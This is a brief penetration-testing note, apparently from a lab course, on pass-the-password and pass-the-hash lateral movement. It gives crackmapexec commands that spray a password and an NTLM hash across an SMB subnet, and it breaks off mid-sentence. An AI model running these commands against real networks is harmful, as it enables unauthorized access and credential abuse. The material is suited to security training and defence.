# **Pass the Password / Pass the Hash**

## **What are this?**

If we crack a password and/or can dump the SAM hashes with **secretsdump.py** or **ntlmrelayx.py**, we can leverage both for lateral movement in networks



## **Attack 1  : Crackmapexec**

```powershell
# show help message
$ crackmapexec --help

# Pass the password attack
$ sudo crackmapexec smb 192.168.0.0/24 -u fcastle -d MARVEL.local -p Password1

# Pass the hash attack
$ sudo crackmapexec smb 192.168.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

### **Example**

![](https://i.imgur.com/BEJeQ9g.jpg)


**Note :** We cannot use NTLMv2 hashes for the pass the hash attack [refer to LLMNR poisoning for this type of hashes] , 